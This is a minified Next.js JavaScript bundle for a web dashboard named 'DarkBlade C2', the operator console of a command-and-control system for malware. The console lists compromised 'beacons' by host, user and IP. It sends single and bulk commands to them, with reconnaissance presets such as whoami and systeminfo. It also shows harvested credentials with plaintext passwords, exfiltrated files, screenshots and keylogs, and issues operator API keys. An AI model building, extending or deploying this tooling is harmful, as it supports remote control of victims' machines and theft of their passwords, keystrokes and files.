(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[670],{9610:(e,s,t)=>{Promise.resolve().then(t.bind(t,9779))},9779:(e,s,t)=>{"use strict";t.r(s),t.d(s,{default:()=>c});var a=t(5155),n=t(2115);function c(){let[e,s]=(0,n.useState)(""),[t,c]=(0,n.useState)([]),[r,o]=(0,n.useState)(""),[l,i]=(0,n.useState)(""),[d,h]=(0,n.useState)([]),[m,x]=(0,n.useState)(""),[p,u]=(0,n.useState)([]),[j,f]=(0,n.useState)([]),[b,y]=(0,n.useState)(""),[N,g]=(0,n.useState)(""),[v,k]=(0,n.useState)(""),[w,S]=(0,n.useState)(""),[z,C]=(0,n.useState)(""),[T,P]=(0,n.useState)([]),[_,E]=(0,n.useState)(""),[I,H]=(0,n.useState)([]),[O,D]=(0,n.useState)("operator"),[A,B]=(0,n.useState)("operator"),[U,K]=(0,n.useState)("read,write"),J=(0,n.useMemo)(()=>"",[]);(0,n.useEffect)(()=>{s(localStorage.getItem("darkblade_api_key")||"")},[]);let R=(0,n.useMemo)(()=>({"X-API-Key":e}),[e]);async function L(){try{let e=await fetch("".concat(J,"/api/beacons"),{headers:R});if(!e.ok)throw Error("HTTP ".concat(e.status));let s=await e.json();c(s.beacons||[])}catch(e){console.error(e),c([])}}async function G(e){try{let s=await fetch("".concat(J,"/api/beacon/").concat(e,"/history?limit=50"),{headers:R});if(!s.ok)throw Error("HTTP ".concat(s.status));let t=((await s.json()).history||[]).map(e=>"[".concat(e.timestamp,"] ").concat(e.operator," ").concat(e.status," > ").concat(e.command,"\n").concat((e.result||"").trim(),"\n")).join("\n");i(t||"No history")}catch(e){i(String(e))}}async function M(e){try{let s=await fetch("".concat(J,"/api/beacon/").concat(e,"/screenshots"),{headers:R});if(!s.ok)throw Error("HTTP ".concat(s.status));let t=await s.json();h(t.items||[])}catch(e){h([])}}async function q(e){try{let s=await fetch("".concat(J,"/api/beacon/").concat(e,"/keylogs"),{headers:R});if(!s.ok)throw Error("HTTP ".concat(s.status));let t=((await s.json()).items||[]).map(e=>"[".concat(e.timestamp,"] ").concat(e.window,"\n").concat(e.keystrokes)).join("\n\n");x(t||"No keylogs")}catch(e){x(String(e))}}async function F(e){try{let s=await fetch("".concat(J,"/api/beacon/").concat(e,"/files"),{headers:R});if(!s.ok)throw Error("HTTP ".concat(s.status));let t=await s.json();f(t.items||[])}catch(e){f([])}}async function X(){try{let e=await fetch("".concat(J,"/api/credentials"),{headers:R});if(!e.ok)throw Error("HTTP ".concat(e.status));let s=await e.json();u(s.items||[])}catch(e){u([])}}async function Q(){if(!r)return alert("Select a beacon first");let e=document.getElementById("cmd").value.trim();if(!e)return;let s=await fetch("".concat(J,"/api/beacon/").concat(r,"/command"),{method:"POST",headers:{...R,"Content-Type":"application/json"},body:JSON.stringify({command:e})});if(!s.ok)return alert("Error ".concat(s.status));document.getElementById("cmd").value="",setTimeout(()=>G(r),1e3)}async function V(){try{let e={command:b},s=N.split(/[,\s]+/).map(e=>e.trim()).filter(Boolean);s.length&&(e.beacon_ids=s),v.trim()&&(e.group=v.trim()),w.trim()&&(e.tags=w.trim());let t=await fetch("/api/beacons/bulk/command",{method:"POST",headers:{...R,"Content-Type":"application/json"},body:JSON.stringify(e)});if(!t.ok)throw Error("HTTP ".concat(t.status));let a=await t.json();C("Sent to ".concat(a.sent," beacon(s)"))}catch(e){C(String(e))}}async function W(){try{let e=await fetch("/api/keys",{headers:R});if(!e.ok)throw Error("HTTP ".concat(e.status));let s=await e.json();H(s.keys||[])}catch(e){H([])}}async function Y(){try{let e=await fetch("/api/keys",{method:"POST",headers:{...R,"Content-Type":"application/json"},body:JSON.stringify({username:O,role:A,permissions:U})});if(!e.ok)throw Error("HTTP ".concat(e.status));let s=await e.json();alert("New key: ".concat(s.key)),W()}catch(e){alert(String(e))}}async function Z(e){if(!confirm("Delete this key?"))return;let s=await fetch("/api/keys/".concat(e),{method:"DELETE",headers:R});if(!s.ok)return alert("HTTP ".concat(s.status));W()}function $(e){P(e);try{localStorage.setItem("darkblade_cmd_presets",JSON.stringify(e))}catch(e){}}return(0,n.useEffect)(()=>{L(),X(),W(),function(){try{let e=localStorage.getItem("darkblade_cmd_presets");if(e){let s=JSON.parse(e);if(Array.isArray(s)&&s.length){P(s),E(s[0]);return}}}catch(e){}let e=["whoami","hostname","ipconfig","ip a","systeminfo","uname -a","dir","ls -la","powershell Get-Date","date"];P(e),E(e[0])}()},[e]),(0,a.jsxs)("div",{className:"min-h-screen bg-black text-zinc-200",children:[(0,a.jsxs)("header",{className:"flex items-center justify-between p-4 border-b border-zinc-800",children:[(0,a.jsxs)("div",{className:"flex items-center gap-3",children:[(0,a.jsx)("h1",{className:"text-xl font-bold",style:{color:"#ff2f92"},children:"DarkBlade C2"}),(0,a.jsx)("span",{className:"text-xs opacity-60",children:"SPA"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-2",children:[(0,a.jsx)("label",{className:"text-sm opacity-70",children:"API Key"}),(0,a.jsx)("input",{id:"apiKey",value:e,onChange:e=>s(e.target.value),type:"password",className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-[380px] font-mono",placeholder:"Paste API key"}),(0,a.jsx)("button",{onClick:function(){localStorage.setItem("darkblade_api_key",e.trim()),alert("Saved")},className:"px-3 py-1 rounded text-black font-semibold",style:{background:"#ff2f92"},children:"Save"}),(0,a.jsx)("button",{onClick:L,className:"px-3 py-1 rounded bg-zinc-800 border border-zinc-700",children:"Refresh"})]})]}),(0,a.jsxs)("main",{className:"p-4 grid grid-cols-12 gap-4",children:[(0,a.jsxs)("section",{className:"col-span-12 lg:col-span-7 space-y-3",children:[(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Files (Exfil)"}),(0,a.jsx)("div",{className:"overflow-auto",children:(0,a.jsxs)("table",{className:"w-full text-sm",children:[(0,a.jsx)("thead",{className:"text-left opacity-70",children:(0,a.jsxs)("tr",{children:[(0,a.jsx)("th",{children:"ID"}),(0,a.jsx)("th",{children:"Name"}),(0,a.jsx)("th",{children:"Type"}),(0,a.jsx)("th",{children:"Size"}),(0,a.jsx)("th",{children:"Time"}),(0,a.jsx)("th",{children:"Actions"})]})}),(0,a.jsxs)("tbody",{children:[0===j.length&&(0,a.jsx)("tr",{children:(0,a.jsx)("td",{colSpan:6,className:"opacity-60",children:"No files"})}),j.map(s=>(0,a.jsxs)("tr",{children:[(0,a.jsx)("td",{className:"font-mono text-xs",children:s.id}),(0,a.jsx)("td",{children:s.filename}),(0,a.jsx)("td",{children:s.type}),(0,a.jsxs)("td",{children:[s.size||0," B"]}),(0,a.jsx)("td",{className:"font-mono text-xs",children:s.timestamp}),(0,a.jsx)("td",{children:(0,a.jsx)("a",{className:"underline",href:"/api/file/".concat(s.id,"?api_key=").concat(encodeURIComponent(e)),children:"Download"})})]},s.id))]})]})})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsxs)("div",{className:"flex items-center justify-between",children:[(0,a.jsx)("h2",{className:"font-semibold",children:"Active Beacons"}),(0,a.jsxs)("span",{className:"text-xs opacity-70",children:["Selected: ",(0,a.jsx)("input",{value:r,readOnly:!0,className:"bg-transparent border-b border-zinc-600 w-64 font-mono text-xs"})]})]}),(0,a.jsx)("div",{className:"overflow-auto mt-2",children:(0,a.jsxs)("table",{className:"w-full text-sm",children:[(0,a.jsx)("thead",{className:"text-left opacity-70",children:(0,a.jsxs)("tr",{children:[(0,a.jsx)("th",{children:"ID"}),(0,a.jsx)("th",{children:"Host"}),(0,a.jsx)("th",{children:"User"}),(0,a.jsx)("th",{children:"OS"}),(0,a.jsx)("th",{children:"IP"}),(0,a.jsx)("th",{children:"Last Seen"}),(0,a.jsx)("th",{children:"Health"})]})}),(0,a.jsxs)("tbody",{children:[0===t.length&&(0,a.jsx)("tr",{children:(0,a.jsx)("td",{colSpan:7,className:"opacity-60",children:"No beacons"})}),t.map(e=>(0,a.jsxs)("tr",{className:"hover:bg-zinc-800/60 cursor-pointer ".concat(r===e.id?"bg-zinc-800":""),onClick:()=>{var s;o(s=e.id),G(s),M(s),q(s),F(s)},children:[(0,a.jsx)("td",{className:"font-mono text-xs",children:e.id}),(0,a.jsx)("td",{children:e.hostname||""}),(0,a.jsx)("td",{children:e.username||""}),(0,a.jsx)("td",{children:e.os||""}),(0,a.jsx)("td",{children:e.ip||""}),(0,a.jsx)("td",{className:"font-mono text-xs",children:e.last_seen||""}),(0,a.jsx)("td",{children:e.health||""})]},e.id))]})]})}),(0,a.jsxs)("div",{className:"mt-3 flex items-center gap-2",children:[(0,a.jsx)("input",{id:"cmd",className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 w-full font-mono",placeholder:"whoami"}),(0,a.jsx)("button",{onClick:Q,className:"px-3 py-1 rounded text-black font-semibold",style:{background:"#ff2f92"},children:"Send"})]})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Credentials"}),(0,a.jsx)("div",{className:"overflow-auto",children:(0,a.jsxs)("table",{className:"w-full text-sm",children:[(0,a.jsx)("thead",{className:"text-left opacity-70",children:(0,a.jsxs)("tr",{children:[(0,a.jsx)("th",{children:"Beacon"}),(0,a.jsx)("th",{children:"Source"}),(0,a.jsx)("th",{children:"User"}),(0,a.jsx)("th",{children:"Password"}),(0,a.jsx)("th",{children:"Domain"}),(0,a.jsx)("th",{children:"Time"})]})}),(0,a.jsxs)("tbody",{children:[0===p.length&&(0,a.jsx)("tr",{children:(0,a.jsx)("td",{colSpan:6,className:"opacity-60",children:"No credentials"})}),p.map((e,s)=>(0,a.jsxs)("tr",{children:[(0,a.jsx)("td",{className:"font-mono text-xs",children:e.beacon_id}),(0,a.jsx)("td",{children:e.source}),(0,a.jsx)("td",{children:e.username}),(0,a.jsx)("td",{className:"font-mono",children:e.password}),(0,a.jsx)("td",{children:e.domain||""}),(0,a.jsx)("td",{className:"font-mono text-xs",children:e.timestamp})]},s))]})]})})]})]}),(0,a.jsxs)("section",{className:"col-span-12 lg:col-span-5 space-y-3",children:[(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Bulk Commands"}),(0,a.jsxs)("div",{className:"space-y-2",children:[(0,a.jsx)("input",{value:b,onChange:e=>y(e.target.value),className:"w-full px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"Command (required)"}),(0,a.jsx)("input",{value:N,onChange:e=>g(e.target.value),className:"w-full px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"Beacon IDs (comma/space separated)"}),(0,a.jsxs)("div",{className:"grid grid-cols-2 gap-2",children:[(0,a.jsx)("input",{value:v,onChange:e=>k(e.target.value),className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"Group filter (optional)"}),(0,a.jsx)("input",{value:w,onChange:e=>S(e.target.value),className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"Tags filter (optional)"})]}),(0,a.jsxs)("div",{className:"grid grid-cols-3 gap-2 items-center",children:[(0,a.jsxs)("div",{className:"col-span-2 flex items-center gap-2",children:[(0,a.jsx)("select",{value:_,onChange:e=>{E(e.target.value),y(e.target.value)},className:"w-full px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",children:T.map((e,s)=>(0,a.jsx)("option",{value:e,children:e},s))}),(0,a.jsx)("button",{onClick:()=>y(_),className:"px-3 py-1 rounded bg-zinc-800 border border-zinc-700",children:"Use"}),(0,a.jsx)("button",{onClick:()=>(function(){let e=b.trim();e&&(T.includes(e)||$([e,...T].slice(0,50)),E(e))})(),className:"px-3 py-1 rounded bg-zinc-800 border border-zinc-700",children:"Save Current"})]}),(0,a.jsx)("div",{className:"text-right",children:(0,a.jsx)("button",{onClick:V,className:"px-3 py-1 rounded text-black font-semibold",style:{background:"#ff2f92"},children:"Send"})})]}),(0,a.jsxs)("div",{className:"text-xs opacity-70 flex items-center justify-between",children:[(0,a.jsx)("span",{children:z}),_&&(0,a.jsx)("button",{className:"underline",onClick:()=>{$(T.filter(e=>e!==_)),_==_&&E(T[0]||"")},children:"Delete preset"})]})]})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"API Keys (admin)"}),(0,a.jsxs)("div",{className:"space-y-2",children:[(0,a.jsxs)("div",{className:"grid grid-cols-3 gap-2",children:[(0,a.jsx)("input",{value:O,onChange:e=>D(e.target.value),className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"username"}),(0,a.jsxs)("select",{value:A,onChange:e=>B(e.target.value),className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700",children:[(0,a.jsx)("option",{value:"admin",children:"admin"}),(0,a.jsx)("option",{value:"operator",children:"operator"}),(0,a.jsx)("option",{value:"viewer",children:"viewer"})]}),(0,a.jsx)("input",{value:U,onChange:e=>K(e.target.value),className:"px-2 py-1 rounded bg-zinc-900 border border-zinc-700 font-mono",placeholder:"read,write"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-2",children:[(0,a.jsx)("button",{onClick:Y,className:"px-3 py-1 rounded text-black font-semibold",style:{background:"#ff2f92"},children:"Create Key"}),(0,a.jsx)("button",{onClick:W,className:"px-3 py-1 rounded bg-zinc-800 border border-zinc-700",children:"Refresh"})]}),(0,a.jsx)("div",{className:"overflow-auto",children:(0,a.jsxs)("table",{className:"w-full text-sm",children:[(0,a.jsx)("thead",{className:"text-left opacity-70",children:(0,a.jsxs)("tr",{children:[(0,a.jsx)("th",{children:"Hash"}),(0,a.jsx)("th",{children:"User"}),(0,a.jsx)("th",{children:"Role"}),(0,a.jsx)("th",{children:"Perms"}),(0,a.jsx)("th",{children:"Created"}),(0,a.jsx)("th",{children:"Last Used"}),(0,a.jsx)("th",{children:"Actions"})]})}),(0,a.jsxs)("tbody",{children:[0===I.length&&(0,a.jsx)("tr",{children:(0,a.jsx)("td",{colSpan:7,className:"opacity-60",children:"No keys"})}),I.map((e,s)=>(0,a.jsxs)("tr",{children:[(0,a.jsx)("td",{className:"font-mono text-xs",children:e.key_hash}),(0,a.jsx)("td",{children:e.username}),(0,a.jsx)("td",{children:e.role}),(0,a.jsx)("td",{className:"font-mono text-xs",children:e.permissions}),(0,a.jsx)("td",{className:"font-mono text-xs",children:e.created}),(0,a.jsx)("td",{className:"font-mono text-xs",children:e.last_used||""}),(0,a.jsx)("td",{children:(0,a.jsx)("button",{className:"underline",onClick:()=>Z(e.key_hash),children:"Delete"})})]},s))]})]})})]})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Command History"}),(0,a.jsx)("pre",{className:"bg-black/70 p-3 rounded max-h-[420px] overflow-auto font-mono whitespace-pre-wrap",children:l})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Screenshots"}),(0,a.jsxs)("div",{className:"grid grid-cols-2 gap-3",children:[0===d.length&&(0,a.jsx)("div",{className:"opacity-60",children:"No screenshots"}),d.map(s=>(0,a.jsxs)("div",{children:[(0,a.jsx)("div",{className:"font-mono text-xs opacity-60 mb-1",children:s.timestamp}),(0,a.jsx)("img",{className:"rounded border border-zinc-700",src:"/api/screenshot/".concat(s.id,"?api_key=").concat(encodeURIComponent(e))})]},s.id))]})]}),(0,a.jsxs)("div",{className:"rounded p-3",style:{background:"#12131a"},children:[(0,a.jsx)("h2",{className:"font-semibold mb-2",children:"Keylogs"}),(0,a.jsx)("pre",{className:"bg-black/70 p-3 rounded max-h-[320px] overflow-auto font-mono whitespace-pre-wrap",children:m})]})]})]})]})}}},e=>{var s=s=>e(e.s=s);e.O(0,[441,684,358],()=>s(9610)),_N_E=e.O()}]);